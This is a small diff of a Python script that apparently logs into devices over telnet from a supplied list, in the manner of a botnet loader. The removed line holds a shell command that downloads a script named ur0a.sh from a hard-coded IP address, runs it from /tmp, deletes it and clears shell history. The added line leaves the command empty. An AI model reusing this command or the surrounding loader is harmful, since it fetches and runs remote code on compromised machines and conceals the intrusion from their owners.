@@ -8,7 +8,7 @@ from multiprocessing import Process
 if len(sys.argv) < 2:
     sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
 
-cmd="cd /tmp;rm -rf ur0a.sh;wget http://172.93.129.153/ur0a.sh;chmod +x ur0a.sh;./ur0a.sh;sh ur0a.sh;rm -rf ur0a.sh;cd;history -c;"
+cmd=""
 info = open(str(sys.argv[1]),'a+')
 
 def readUntil(tn, string, timeout=8):
